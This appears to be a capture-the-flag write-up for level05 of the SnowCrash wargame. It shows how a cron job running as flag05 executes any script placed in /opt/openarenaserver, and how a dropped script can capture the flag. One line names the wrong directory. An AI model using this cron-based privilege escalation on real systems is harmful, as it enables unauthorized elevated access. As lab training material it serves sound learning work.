"You have a new mail" upon logging in

find / -iname "mail" 2> /dev/null

/etc/mailcap			nothing 
/usr/bin/mail-lock		executable
/var/log/mail.err		permit denied
/var/log/mail.log		permit denied
/var/mail				directory + gotta look
/var/spool/mail			directory + gotta look
/rofs/etc/mailcap		nothing
/rofs/var/mail			directory + gotta look
/rofs/var/spool/mail	lrwxrwxrwx 1 root root 7 Aug 29  2015 /rofs/var/spool/mail -> ../mail

level05@SnowCrash:/var/mail$ cat level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

level05@SnowCrash:/usr/sbin$ cat openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

/var/mail/level05 is a cron job that runs every 2 minutes and executes all the scripts in
/usr/sbin/openarenaserver

Knowing this we can put a costum script in there such as :
touch script.sh
	```#!/bin/sh
	getflag > /tmp/flag.txt```

now wait for the cron to execute our script and fetch the result in /tmp/flag.txt